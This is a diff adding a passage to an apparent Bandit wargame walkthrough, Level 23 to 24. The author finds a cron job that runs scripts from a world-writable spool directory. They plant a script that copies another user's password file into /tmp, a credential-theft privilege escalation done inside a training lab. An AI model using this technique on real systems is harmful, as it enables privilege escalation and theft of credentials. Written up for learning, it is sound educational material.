@@ -529,6 +529,132 @@ This level helped me understand how cron jobs run with the permissions of their 
 
 
 
+## Level 23 → Level 24
+
+For this level, the challenge required investigating another cron job running automatically. This level was different from previous ones because it required creating my own shell script that would be executed by the cron job.
+
+I first navigated to the cron directory:
+
+```bash
+cd /etc/cron.d
+```
+
+After listing the files, I found the relevant cron job:
+
+```bash
+ls
+```
+
+I inspected it:
+
+```bash
+cat cronjob_bandit24
+```
+
+The output showed:
+
+```text
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+This showed that a script called `cronjob_bandit24.sh` was being executed automatically as the user `bandit24`.
+
+I then inspected the script:
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+The script contained:
+
+```bash
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+```
+
+After analyzing the script, I understood that it executes scripts placed inside:
+
+```bash
+/var/spool/bandit24/foo
+```
+
+and then deletes them afterward. The script only executes files owned by `bandit23`.
+
+I then checked the permissions of the directory:
+
+```bash
+ls -ld /var/spool/bandit24/foo
+```
+
+The output showed:
+
+```text
+drwxrwx-wx
+```
+
+After researching Linux directory permissions, I understood that although I could not list the contents of the directory, I could still create files inside it because I had write and execute permissions.
+
+My next step was creating a script that would be executed by the cron job. Before creating the final version, I tested the idea by creating a simple script that saved the output of:
+
+```bash
+whoami
+```
+
+into a temporary file to confirm that the cron job was executing my script.
+
+After confirming that it worked, I created the final script:
+
+```bash
+touch script.sh
+nano script.sh
+```
+
+The script contained:
+
+```bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/41
+```
+
+I then made it executable:
+
+```bash
+chmod +x script.sh
+```
+
+After waiting for the cron job to execute the script, the file was removed as expected. I then checked the temporary file:
+
+```bash
+cat /tmp/41
+```
+
+This revealed the password for the next level.
+
+This level helped me understand how cron jobs can execute scripts, how Linux directory permissions work, and how automated processes can perform actions with different user privileges. cool level.
+
+
+
+
+
 
 
 
